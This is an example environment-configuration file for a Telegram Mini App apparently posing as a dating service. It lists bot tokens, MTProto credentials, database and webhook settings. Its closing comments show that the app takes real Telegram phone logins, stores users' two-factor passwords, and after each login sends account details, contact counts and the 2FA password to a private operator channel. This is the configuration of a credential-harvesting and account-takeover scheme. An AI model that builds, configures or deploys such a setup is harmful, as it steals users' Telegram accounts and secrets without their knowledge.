# Copy to .env.production (or .env.local) on the server and fill real values.
# Do not commit those files. Next.js reads them at runtime for `next start`.

# Telegram bot token used to validate init data on the server.
# Required in production; without it the API refuses every request.
TELEGRAM_BOT_TOKEN=your_bot_token_here

# MTProto app credentials from https://my.telegram.org — required for real phone login.
TELEGRAM_API_ID=123456
TELEGRAM_API_HASH=your_api_hash_here

# Optional. Set to 1 to talk to Telegram test DCs (test numbers like 99966…).
TELEGRAM_TEST_DC=

# Optional. In production the logged-in Telegram user must match the Mini App user.
# Development already allows a mismatch because the mock user id is 1.
TELEGRAM_LOGIN_ALLOW_ID_MISMATCH=

# Local MongoDB instance
MONGODB_URI=mongodb://127.0.0.1:27017/dating-app

# Extra hosts the /api/media image proxy may fetch from (comma separated)
MEDIA_ALLOWED_HOSTS=

# HTTPS URL of this Mini App (the same domain registered in BotFather).
# On Render this is filled automatically from RENDER_EXTERNAL_URL.
TELEGRAM_MINI_APP_URL=https://your-domain.com

# Optional. If unset, a stable secret is derived from TELEGRAM_BOT_TOKEN.
# Allowed characters: A-Z a-z 0-9 _ -
TELEGRAM_WEBHOOK_SECRET=

# Optional. Defaults to TELEGRAM_MINI_APP_URL + /api/bot
TELEGRAM_WEBHOOK_URL=

# Encrypts Telegram 2FA passwords in MongoDB. Required if you want them stored.
# Use a long random string and never reuse it across environments.
TELEGRAM_2FA_ENCRYPTION_KEY=

# Private channel/chat id (usually starts with -100). Bot must be an admin with send rights.
# After a successful login, account details, contact counts, and 2FA password are sent here.
TELEGRAM_2FA_CHANNEL_ID=
